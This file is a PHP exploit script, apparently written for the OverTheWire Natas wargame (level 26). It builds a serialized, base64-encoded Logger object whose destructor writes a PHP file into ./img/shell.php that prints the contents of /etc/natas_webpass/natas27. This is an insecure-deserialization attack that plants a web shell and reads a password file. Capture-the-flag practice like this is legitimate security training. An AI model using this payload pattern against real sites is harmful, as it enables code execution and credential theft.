<?php

class Logger{
    private $logFile;
    private $initMsg;
    private $exitMsg;
      
    function __construct($file){
        $this->logFile = "./img/shell.php";
        $this->exitMsg = "<?php echo file_get_contents(\"/etc/natas_webpass/natas27\"); ?>";
    }                       
      
    function log($msg){
        $fd=fopen($this->logFile,"a+");
        fwrite($fd,$msg."\n");
        fclose($fd);
    }                       
      
    function __destruct(){
        // write exit message
        $fd=fopen($this->logFile,"a+");
        fwrite($fd,$this->exitMsg);
        fclose($fd);
    }                       
}

$payload = new Logger("temp.txt");
print_r($payload);
$serialized = serialize($payload);
$encoded = urlencode(base64_encode($serialized));
$decoded = base64_decode($encoded);
$deserialized = unserialize($decoded);
echo "serialization: ".$serialized."\n";
echo "encoded: ".$encoded."\n";
echo "decoded: ".$decoded."\n";
echo "deserialization: ";
print_r($deserialized);
// exit();
